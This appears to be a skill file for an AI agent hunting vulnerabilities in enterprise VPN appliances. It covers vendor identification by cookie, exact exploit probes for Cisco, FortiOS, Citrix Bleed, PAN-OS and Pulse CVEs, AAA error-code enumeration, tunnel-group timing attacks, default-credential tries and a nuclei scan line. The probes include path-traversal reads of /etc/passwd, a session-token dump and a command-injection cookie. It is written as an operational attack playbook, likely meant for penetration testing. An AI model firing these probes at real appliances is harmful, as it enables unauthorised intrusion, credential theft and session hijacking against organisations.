---
name: hunt-vpn-appliance
description: Enterprise VPN appliance hunting — cookie-based vendor identification (webvpn, SVPNCOOKIE, NSC_AAA, DSAuthSession, global-protect), high-yield CVEs with exact probes (CVE-2020-3452 Cisco, CVE-2018-13379 FortiOS, CVE-2023-4966 Citrix Bleed, CVE-2024-3400 PAN-OS, CVE-2019-11510 Pulse), AAA backend identification from error text (a0= codes, AADSTS), SAML metadata checks, tunnel-group enumeration, no-version-banner trust. Use when VPN/SSL-VPN appliances detected. Trigger keywords: VPN, Citrix, Fortinet, Pulse, PAN-OS, GlobalProtect, SSL VPN, CVE-2020-3452.
---

# Enterprise VPN Appliances — Deep Hunting

## THE GATE — Cookie-Based Vendor Identification
`webvpn=` (Cisco), `SVPNCOOKIE=` (Fortinet), `NSC_AAA=` (Citrix), `DSAuthSession=` (Pulse/Ivanti), `PHPSESSID` on `/global-protect/login.esp` (Palo Alto), `swap`/`swapauth` (SonicWall), `BIGipServer*`/`MRHSession=` (F5).

## High-Yield CVEs with Exact Probes
- **CVE-2020-3452** Cisco file read (`/+CSCOE+/files/file_name.html?Filename=.../portal_inc.lua`).
- **CVE-2018-13379** FortiOS session dump (`/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` → plaintext usernames).
- **CVE-2023-4966 Citrix Bleed** (28KB+ `Host` header on `/oauth/idp/.well-known/openid-configuration` → memory leak containing session tokens).
- **CVE-2024-3400** PAN-OS (cookie `SESSID=../../../var/log/pan/test_$(id)_test.txt` path-injection).
- **CVE-2019-11510** Pulse (`/dana-na/../.../etc/passwd?.../guacamole/`).

## AAA Backend Identification from Error Text (undervalued)
Cisco `a0=2/3/4/12/115` codes (unknown user/wrong pw/restricted/locked/generic fail); AADSTS → Entra-backed; RADIUS/LDAP strings. Steers the whole downstream strategy.

## Always Checkable
SAML SP metadata anonymously (`/+CSCOE+/saml/sp/metadata`, `/remote/saml/metadata`) even on patched appliances. Cisco tunnel-group enumeration via response-timing differential on `/+webvpn+/index.html` POST.

## Key Endpoints
`+CSCOE+/logon.html`, `/remote/login`, `/global-protect/login.esp`, `/dana-na/auth/url_default/welcome.cgi`, `/my.policy`.

## Fingerprinting
Banner stripping is defense-in-depth — don't conclude "patched"; test 3+ CVEs per vendor since backports happen without version bumps. `nuclei -tags vpn,cisco-asa,fortinet,citrix,palo-alto,pulse-secure,sonicwall,f5 -severity high,critical -rl 5`.

## Validation
File-read CVEs must return real file content (`root:x:0:0`); Citrix Bleed needs >10KB response with random memory; CVE-2024-3400 needs file-creation side-effect. Default creds ≤2 attempts (lockout risk).

## Common Mistakes
404 on one CVE path = patched; trusting version banner; running heavy scans without rate-limit on critical infra; running disruptive pre-auth RCE PoCs without OK (bricking a concentrator is catastrophic); skipping SAML metadata.